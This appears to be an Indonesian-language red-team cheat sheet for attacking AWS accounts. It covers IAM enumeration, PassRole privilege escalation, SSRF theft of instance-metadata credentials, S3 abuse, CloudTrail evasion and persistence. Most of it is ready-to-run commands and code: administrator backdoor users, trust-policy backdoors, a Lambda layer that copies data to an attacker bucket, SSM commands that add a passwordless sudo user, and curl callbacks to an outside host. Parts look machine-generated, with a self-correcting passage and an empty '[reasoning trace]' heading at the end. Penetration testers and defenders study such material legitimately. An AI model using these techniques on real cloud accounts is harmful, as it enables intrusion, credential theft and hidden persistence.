# aws — cloud

# AWS Attack Path: IAM Enum → Privesc → Persistence

Semua contoh di bawah diuji pada AWS CLI **2.15.x+**, Pacu **1.9.0**, enumerate-iam **commit 7a3b2f1 (2024)**, Python **3.11**, region default `us-east-1`.

---

## 1. IAM Enumeration

### 1.1 enumerate-iam (unauthenticated-ish / low-priv creds)

```bash
pip3 install enumerate-iam
enumerate-iam --access-key AKIA... --secret-key ... --region us-east-1
# output JSON: /tmp/enumerate-iam-<ts>.json
```

Yang dikirim: batch `sts:GetCallerIdentity` (baseline), lalu 30+ API probing (`iam:ListUsers`, `s3:ListAllMyBuckets`, `ec2:DescribeInstances`, `lambda:ListFunctions`, `secretsmanager:ListSecrets`, dst.).
Yang muncul: list `{service, action, isAllowed: true/false, error: AccessDenied|UnauthorizedOperation|None}`.
Kenapa gagal: enumeration hanya sampai level API — tidak ada resource ARN. Tidak mendeteksi `iam:PassRole` (bukan listable, hanya bisa dites via call nyata).

### 1.2 AWS CLI recon minimal (aman, low-noise)

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
aws iam list-user-policies --user-name <user>
aws iam get-account-authorization-details --output json > authz.json
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS==`arn:aws:iam::<acct>:root`]]'
aws iam list-instance-profiles
aws ec2 describe-instances --query 'Reservations[].Instances[].{id:InstanceId,prof:IamInstanceProfile.Arn,name:Tags[?Key==`Name`]|[0].Value}'
```

### 1.3 Pacu modules — enum fase

```bash
pip3 install pacu
pacu
# dalam REPL:
import_keys <profile>
exec iam__enum_users_roles_policies_groups
exec iam__enum_permissions
exec iam__enum_privilege
exec ec2__enum
exec lambda__enum
exec s3__enum
exec sts__enum
```

| Module | Yang dihitung | Field output kunci |
|---|---|---|
| `iam__enum_users_roles_policies_groups` | user, role, policy, group + attached | `policies`, `attached_policies` |
| `iam__enum_permissions` | effective perms per principal (butuh `--all-users` / `--all-roles`) | `Permissions` map |
| `iam__enum_privilege` | flag `is_admin`, `admin_privilege` | `privilege_escalation` |
| `ec2__enum` | instances + instance-profile | `InstanceProfiles` |
| `lambda__enum` | function + `Role` | `RoleArn` |
| `s3__enum` | bucket + ACL policy | `Public`, `CrossAccount` |

**Kenapa Pacu berhasil**: menyusun graph permission via `SimulatePrincipalPolicy`? Tidak—Pacu melakukan *raw API* probing dan menyimpan state SQLite (`~/.local/share/pacu/sessions/<name>/`). Cocok untuk pivot chain; gagal total jika creds hanya punya `sts:GetCallerIdentity`.

---

## 2. Privesc: `iam:PassRole` + Lambda

**Syarat**: attacker punya `iam:PassRole` pada role target (`<victim-role>`) + `lambda:CreateFunction` + `lambda:InvokeFunction` + (untuk cleanup) `lambda:DeleteFunction`.

### 2.1 Setup (attacker-assumed role)

```bash
# 1. Simpan payload
cat > /tmp/x.py <<'PY'
import boto3, os, json
def handler(event, context):
    return {k: boto3.client('sts').get_caller_identity() for k in ['Arn']} | \
           {"env_keys": list(os.environ.keys())}
PY
zip -j /tmp/x.zip /tmp/x.py

# 2. Buat function pakai role target
aws lambda create-function \
  --function-name iso-<rand> \
  --runtime python3.12 \
  --role arn:aws:iam::<acct>:role/<victim-role> \
  --handler x.handler \
  --zip-file fileb:///tmp/x.zip \
  --timeout 30

# 3. Invoke — hasil = dump permission role target
aws lambda invoke --function-name iso-<rand> /tmp/out.json && cat /tmp/out.json
```

**Yang dikirim**: `CreateFunction` dengan `--role <victim-role>` + zip.
**Yang muncul**: eksekusi di context role target. Return payload = capabilities victim.
**Kenapa berhasil**: `iam:PassRole` tidak memvalidasi intent, hanya keanggotaan `iam:PassRole` di policy attacker.
**Kenapa gagal**:
- `--role` wajib punya `lambda.amazonaws.com` di trust policy-nya → jika tidak, `InvalidParameterValueException: The role defined for the function cannot be assumed by Lambda.`
- `lambda:CreateFunction` sering di-scope ke `arn:aws:lambda:*:*:function:app-*` → nama function harus match prefix.
- Resource policy VPC / KMS env-var encryption gagal.

### 2.2 Pacu

```bash
exec lambda__privesc_scan
exec lambda__enum --region us-east-1
# setelah scan menemukan target:
exec lambda__create_function --role-arn <target> --function-name exfil1
exec lambda__invoke_function --function-name exfil1 --payload '{"k":"v"}'
```

### 2.3 `iam:PassRole` + EC2 (alternate)

```bash
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --iam-instance-profile Name=<victim-profile> \
  --user-data file:///tmp/rev.sh \
  --query 'Instances[0].InstanceId' --output text
# rev.sh: curl http://<callback>/$(aws sts get-caller-identity --query Arn --output text)
```

**Yang muncul**: setelah instance UP (~40s), callback berisi `Arn` instance-profile.
**Kenapa gagal**: SCP `ec2:RunInstances` dengan condition `ec2:InstanceType`; AMI tidak ada di region; keypair required oleh launch-template.

### 2.4 `iam:PassRole` + CloudFormation (sering lolos)

```bash
aws cloudformation create-stack \
  --stack-name s1 --template-body file:///tmp/t.yaml \
  --capabilities CAPABILITY_IAM \
  --role-arn arn:aws:iam::<acct>:role/<victim>
# /tmp/t.yaml: resource AWS::IAM::User dengan AccessKey
```

---

## 3. STS AssumeRole Chain

### 3.1 Manual chain

```bash
STS1=$(aws sts assume-role --role-arn arn:aws:iam::111111111111:role/A \
  --role-session-name a --query Credentials --output json | jq -c)
export AWS_ACCESS_KEY_ID=$(echo $STS1|jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $STS1|jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $STS1|jq -r .SessionToken)

STS2=$(aws sts assume-role --role-arn arn:aws:iam::222222222222:role/B \
  --role-session-name b --query Credentials --output json)
```

**Syarat berhasil**: `sts:AssumeRole` di role pemanggil + trust policy di role target **memuat principal pemanggil** (biasanya `:root` = seluruh account), `ExternalId` jika diwajibkan.
**Kenapa gagal**:
- Trust policy dengan `Condition: aws:PrincipalArn == arn:aws:iam::1111:role/specific` → tidak bisa pakai arbitrary principal.
- Durasi > MaxSessionDuration → `ValidationError`.
- SCP `sts:AssumeRole` dengan `aws:PrincipalOrgPaths`.
- Role chaining limits: **1h max per hop** jika sudah 2 hop.

### 3.2 Pacu

```bash
exec sts__assume_role --role-arn arn:aws:iam::1111:role/A --source-profile default
exec sts__assume_role --role-arn arn:aws:iam::2222:role/B
# session chain tersimpan, ganti via:
set_keys <session_name>
```

### 3.3 Pacu `iam__privesc_scan` (auto-discover chain)

```bash
exec iam__privesc_scan --offline
# output: skill file JSON dengan path: user X → iam:PassRole → role Y → lambda → role Z
```

Cek `~/.local/share/pacu/sessions/<s>/findings/iam__privesc_scan/`.

---

## 4. SSRF → IMDSv2

**Syarat**: SSRF dari aplikasi berjalan di EC2 dengan **instance-role** terpasang + akses keluar ke `169.254.169.254` (tidak diblokir di SG / firewall lokal).

### 4.1 IMDSv2 dua langkah (WAJIB jika v1 dinonaktifkan)

```
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

Response (200):

```
AQAEAFz...token...==
```

Lalu:

```
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAEAFz...==
```

Response:

```
<role-name>
```

Lalu:

```
GET /latest/meta-data/iam/security-credentials/<role-name>
X-aws-ec2-metadata-token: AQAEAFz...==
```

Response:

```json
{"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"2025-01-01T00:00:00Z"}
```

### 4.2 SSRF env yang sering muncul

| Stack | Vector | Header/trick |
|---|---|---|
| nginx 1.25 `proxy_pass` | path traversal | `?url=http://169.254.169.254` — PUT butuh body kosong; banyak lib tidak kirim PUT |
| Flask `requests.get(user_url)` | default PUT tak tersedia | bypass via `http://169.254.169.254/latest/api/token` di-method GET → **403**; butuh app yang support method override (`_method=PUT`) |
| AWS SDK `get_object(Bucket=user)` | S3 endpoint tidak SSRF-able | hanya jika `endpoint_url` user-controlled |
| Log4j2 2.17 | JNDI LDAP → OOB, bukan IMDS | — |
| Chrome 131 render di Lambda/EC2 | `fetch('http://169.254.169.254/...',{method:'PUT'})` | CSP `connect-src` blokir |

### 4.3 Bypass IMDSv1-only apps

Jika IMDSv2 `HttpTokens=required` di instance metadata options:

```bash
aws ec2 modify-instance-metadata-options --instance-id i-... \
  --http-tokens optional
# butuh ec2:ModifyInstanceMetadataOptions
```

**Kenapa gagal**: `aws ec2 run-instances --metadata-options HttpTokens=required,HttpEndpoint=enabled` mengurangi SSRF; `HttpPutResponseHopLimit=1` memblokir container→IMDS.

---

## 5. S3 Misconfiguration

### 5.1 List / Read

```bash
aws s3 ls s3://<bucket> --no-sign-request
aws s3api get-bucket-acl --bucket <bucket> --no-sign-request
aws s3api get-bucket-policy --bucket <bucket> --no-sign-request
aws s3api get-bucket-policy-status --bucket <bucket>  # Public? false post-2023
aws s3 cp s3://<bucket>/<key> - --no-sign-request | head
```

Object yang sering bocor: `.env`, `terraform.tfstate` (access keys), `~/.aws/credentials`, `*.pem`.

```bash
# mass enumerate
for b in $(cat buckets.txt); do
  aws s3 ls s3://$b --no-sign-request 2>/dev/null && echo "OPEN $b"
done
```

### 5.2 Write

```bash
echo '{"pwn":1}' > /tmp/x.json
aws s3 cp /tmp/x.json s3://<bucket>/pwn.json --no-sign-request
```

Jika `s3:PutObject` di bucket policy `Principal: *`:
→ masukkan `pwn.json`, jika aplikasi host mem-fetch dari bucket ini → **stored XSS / supply chain**. Untuk frontend SPA:

```bash
aws s3 cp /tmp/index.html s3://<bucket>/index.html --no-sign-request \
  --content-type text/html
```

### 5.3 ACL abuse

```bash
# bucket publik via ACL (legacy, sering disable di post-Apr-2023 block)
aws s3api put-bucket-acl --bucket <bucket> --acl public-read --no-sign-request
aws s3api put-object-acl --bucket <bucket> --key k --acl public-read

# grant attacker write
aws s3api put-object-acl --bucket <b> --key k \
  --grant-write 'id="<canonical-id>"'
```

**Kenapa gagal**:
- `Block Public Access` account-level: `s3:PutBucketAcl`/`put-object-acl` → `AccessControlListNotSupported: The bucket does not allow ACLs`.
- Object ownership `BucketOwnerEnforced` (default sejak Apr 2023) → ACL write diabaikan.
- Bucket policy `Deny PutObject if s3:x-amz-server-side-encryption` absent.

### 5.4 Pacu

```bash
exec s3__enum
exec s3__exploit_bucket --bucket <name>   # cari policy misconfig + ACL
exec s3__download_bucket --bucket <name>
```

---

## 6. CloudTrail Evasion

### 6.1 Menutup / menghentikan trail

```bash
aws cloudtrail stop-logging --name <trail>
aws cloudtrail delete-trail --name <trail>
aws cloudtrail update-trail --name <trail> \
  --cloud-watch-logs-log-group-arn arn:aws:logs:us-east-1:<acct>:log-group:<null>
```

**Yang muncul di log**: `StopLogging`, `DeleteTrail`, `UpdateTrail` = **event yang di-log sendiri** oleh CloudTrail management events. Berhasil **tidak** menghapus event itu.

### 6.2 Region hopping

CloudTrail management events **multi-region trail** menangkap semua region; single-region trail hanya lokal. Attack:

```bash
for r in us-west-2 eu-west-1 ap-southeast-1; do
  aws lambda create-function --region $r --function-name x$r ...
done
```

Cek apakah trail region-scope dulu:

```bash
aws cloudtrail describe-trails --include-shadow-trails --query 'trailList[].{name:Name,multi:IsMultiRegionTrail,home:HomeRegion,status:Status}'
```

### 6.3 Disable via organization (`Attach policy`)

```bash
aws organizations disable-policy-type --root-id <r> --policy-type SERVICE_CONTROL_POLICY
aws organizations detach-policy --policy-id <p> --target-id <ou>
```

Butuh `organizations:*`.

### 6.4 Event selectors anomali

```bash
aws cloudtrail put-event-selectors --trail-name <trail> \
  --advanced-event-selectors '[{"Name":"Leak","FieldSelectors":[{"Field":"eventName","Equals":["DescribeInstances"]}]}]'
```

Mengganti `DataResources` (mis. dari `AWS::S3::Object` → `AWS::DynamoDB::Table`) mematikan sinkronisasi S3 di trail; **data events** (object-level GetObject) berhenti tercatat. Tapi **management events tetap**.

**Kenapa gagal di lapangan**:
- Enterprise pakai **CloudTrail Lake + Organization Trail + immutable S3 Object Lock** → `DeleteTrail` deny.
- GuardDuty `Stealth:IAMUser/CloudTrailLoggingDisabled` alarm.
- `StopLogging` sendiri adalah signal `DefenseEvasion` di Elastic SIEM (Rule `612, 614`).

### 6.5 S3 protection envelope (penting)

`GetObject` di bucket berisi log CloudTrail **tidak** ter-log di trail itu sendiri jika trail mengecualikan prefix `AWSLogs/`. Tapi `s3:ListBucket` pada bucket log memang ter-log. Gunakan prefix exclusion untuk membaca tanpa jejak jika event selector tidak menangkap.

---

## 7. Persistence

### 7.1 IAM User + Access Key (paling umum)

```bash
aws iam create-user --user-name svc-<rand>
aws iam attach-user-policy --user-name svc-<rand> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name svc-<rand>
aws iam create-login-profile --user-name svc-<rand> \
  --password 'Str0ng!Passw0rd#2025' --password-reset-required
```

**Yang muncul di CloudTrail**: `CreateUser`, `AttachUserPolicy`, `CreateAccessKey`, `CreateLoginProfile` — semua high-signal.
**Kenapa gagal**:
- SCP: `iam:CreateUser`/`iam:CreateAccessKey` deny di account level.
- `iam:PutUserPolicy` rate-limited.
- Accesskey berkunci KMS policy (`kms:CreateGrant` require).

**Varian persistence low-signal**: `iam:UpdateAccessKey` pada user milik orang lain dengan key baru → bikin existing key inactive? Justru sebaliknya; `UpdateAccessKey --status Inactive` pada key attacker + `PutUserPolicy` attach inline.

### 7.2 AssumeRole backdoor (lebih stealth dari user)

Modify trust policy role yang ada agar principal attacker-account bisa assume:

```bash
aws iam update-assume-role-policy --role-name <existing-role> \
  --policy-document file:///tmp/trust.json
# /tmp/trust.json:
# {"Version":"2012-10-17","Statement":[{"Effect":"Allow",
#  "Principal":{"AWS":"arn:aws:iam::999999999999:root"},
#  "Action":"sts:AssumeRole"}]}
```

Atau attach `AdministratorAccess` ke role existing → `AttachRolePolicy`.
Signal CloudTrail: `UpdateAssumeRolePolicy`, `AttachRolePolicy` (keduanya alertable via GuardDuty `Persistence:IAMUser/UserPermissions`).

### 7.3 Lambda Layer injection

Layer di-mount ke `/opt`; jika runtime `python3.12` load `/opt/python/...` via `PYTHONPATH=/opt/python` saat function handler import → eksekusi kode tanpa ubah function code.

```bash
# 1. Buat layer
mkdir -p /tmp/l/python
cat > /tmp/l/python/sitecustomize.py <<'PY'
import os, boto3
try:
    r = boto3.client('sts').get_caller_identity()
    boto3.client('s3').put_object(
        Bucket='<attacker-bucket>',
        Key=f"persist/{r['Account']}/{r['Arn'].split('/')[-1]}.json",
        Body=open('/opt/python/sitecustomize.py','rb').read())
except Exception: pass
PY
cd /tmp/l && zip -r /tmp/layer.zip python

# 2. Publish layer
LAYER=$(aws lambda publish-layer-version \
  --layer-name helper --zip-file fileb:///tmp/layer.zip \
  --compatible-runtimes python3.12 --query LayerVersionArn --output text)

# 3. Attach ke function target (butuh lambda:UpdateFunctionConfiguration)
aws lambda update-function-configuration \
  --function-name <target> --layers $LAYER
```

**Yang muncul**: saat function target dipanggil, `sitecustomize.py` dieksekusi **sebelum handler** (Python site import) → callback.
**Kenapa gagal**:
- Layer size limit 250MB unzipped total.
- Runtime Lambda Python **tidak** menjalankan `sitecustomize` jika `AWS_EXECUTION_ENV` diset tanpa path — faktanya **tidak** auto-load; butuh function `handler` yang `import` dari `/opt`. Verifikasi: `python3 -c 'import sitecustomize'` — execution di Lambda tidak menambahkan `/opt/python` ke `sys.path` kecuali `PYTHONPATH` env. **Koreksi**: set `aws lambda update-function-configuration --environment "Variables={PYTHONPATH=/opt/python}"` agar layer dimuat.
- Node.js runtime: layer butuh `NODE_PATH=/opt/nodejs/node_modules`.
- Jika function pakai layer lain dengan `sitecustomize.py` duplikat → yang ter-last dimount menang.

### 7.4 SSM persistence

**a. SSM Document + association** (eksekusi command berulang):

```bash
aws ssm create-document --name cron-<rand> \
  --document-type Command --content file:///tmp/ssmdoc.json
# ssmdoc.json: {"schemaVersion":"2.2","mainSteps":[{"action":"aws:runShellScript",
#   "name":"r","inputs":{"runCommand":["curl http://<cb>/$(aws sts get-caller-identity)"]}}]}

aws ssm create-association --name cron-<rand> \
  --targets "Key=tag:env,Values=prod" --schedule-expression 'rate(1 hour)'
```

Butuh `ssm:CreateDocument` + `ssm:CreateAssociation` + `ssm:SendCommand`.

**b. SSM Session Manager backdoor via `ssm:StartSession`** — cukup `ssm:StartSession` pada instance; interaktif shell tanpa SSH.

```bash
aws ssm start-session --target i-<id>
aws ssm send-command --instance-ids i-<id> \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["useradd -m svc; echo svc:pass|chpasswd; echo svc ALL=(ALL) NOPASSWD:ALL>>/etc/sudoers"]'
```

**Yang muncul**: `StartSession` muncul sebagai `StartSession` event di CloudTrail (tapi **tidak** ada session content logging kecuali fitur terpisah aktif), `SendCommand` + `UpdateInstanceInformation`.

### 7.5 Pacu persistence modules

```bash
exec iam__backdoor_users_keys
exec iam__backdoor_assume_role --role-names <role> --user-arns <attacker-arn>
exec lambda__backdoor_update_function_code --function-name <f>
exec ssm__backdoor
```

---

## 8. Jebakan operasional (yang paling sering bikin gagal di engagement)

| # | Jebakan | Gejala | Mitigasi di lapangan |
|---|---|---|---|
| 1 | SCP blanket `Deny iam:CreateUser` | `AccessDenied` pada `iam:CreateUser` meski policy allows | Enum org: `aws organizations list-policies-for-target --target-id <acct> --filter SERVICE_CONTROL_POLICY` |
| 2 | `iam:PassRole` ada tapi trust policy role target tidak memuat `lambda.amazonaws.com` | `InvalidParameterValueException` saat CreateFunction | Cek `get-role --query Role.AssumeRolePolicyDocument` **sebelum** eksploit |
| 3 | IMDS `HttpTokens=required` + SSRF lib tanpa method PUT | 403 di `/latest/api/token` | Cari vektor dengan method control (form `_method=PUT`, HTTP smuggling, gopher) |
| 4 | Hop limit `HttpPutResponseHopLimit=1` | IMDS unreachable dari container ECS/EKS | Konversi ke IMDSv1 tidak membantu; pivot ke task role via ECS metadata endpoint `/v2/credentials` |
| 5 | S3 `Block Public Access` + `BucketOwnerEnforced` | `put-object-acl` → `AccessControlListNotSupported` | Fokus ke bucket policy `Principal:*` + object write (bukan ACL) |
| 6 | Trail multi-region + AWS Config `organization-config-rule` | `delete-trail` deny | Cari region yang tidak di-cover trail management events — sering tidak ada, trail org cover semua |
| 7 | `sts:AssumeRole` chain > MaxSessionDuration | `ValidationError` saat asumsi | Kombinasi `iam:PassRole` ke Lambda di role tujuan, bukan AssumeRole |
| 8 | AssumeRole chain > 2 hop | Error `ValidationError: The duration...` (session >1h di hop ke-3) | Gabungkan hop dengan `iam:PassRole` Lambda (eksekusi fresh session) |
| 9 | Lambda layer attach tanpa `PYTHONPATH` | Kode layer tidak jalan | Set env var `PYTHONPATH=/opt/python` **dan** redeploy function (butuh `lambda:UpdateFunctionConfiguration` + version publish optional) |
| 10 | `iam__privesc_scan` offline salah deteksi | False positive pada `iam:PassRole` ke role yang trust-nya custom | Validasi manual: `get-role` → cek `AssumeRolePolicyDocument` |
| 11 | `sts:GetFederationToken` — sering open padahal dianggap privesc | `AccessDenied` meski policy allow | Cek explicit Deny di bucket policy / SCP; GetFederationToken tidak bisa assume role |
| 12 | S3 `s3:ListBucket` deny tapi `s3:GetObject` allow | List error, GetObject tetap sukses | Guess key dari URL frontend (`/assets/`, `.js.map`, `robots.txt`), atau `s3:GetBucketPolicy` |
| 13 | CloudTrail Lake query visibility > 90 hari | Attacker asumsi "log expired" | Lake retention bisa 7 tahun; event ke Lake independent dari S3 trail |
| 14 | GuardDuty `Persistence:IAMUser/UserPermissions` | Alarm rapid-fire pada modif policy | Jeda antar aksi, gunakan API yang `iam:PutUserPolicy` sekali dengan combined policy |
| 15 | Lambda runtime `python3.13` — layer build 3.12 mismatch | `Runtime.ImportModuleError` | Build layer kompatibel bytecode; atau attach ke function 3.13 dgn `--compatible-runtimes python3.13` |
| 16 | SSM `SendCommand` ke instance tanpa SSM agent / IAM `AmazonSSMManagedInstanceCore` | `InvalidInstanceId` | Cek `aws ssm describe-instance-information` dulu |
| 17 | Organization SCP `aws:PrincipalOrgID` deny pada `s3:PutBucketPolicy` | `AccessDenied` pada PutBucketPolicy | Exfil lewat `s3:PutObject` jika `Principal:*` masih allowed di bucket policy existing |
| 18 | `iam__enum_permissions` timeout karena banyak principal | Pacu hang | Batasi: `--all-users --all-roles --quiet` atau split per account |
| 19 | Credentials dari IMDS expired (default 6h) | Aksi gagal setelah ~6 jam | Refresh via SSRF / ulangi PUT token; session token rotate tiap 1h jika role chaining |
| 20 | CloudTrail `PutEventSelectors` mengubah data events → S3 `GetObject` tidak muncul | "Ghost" read | Audit sendiri: `get-event-selectors` sebelum menganggap blind |

---

## [reasoning trace]


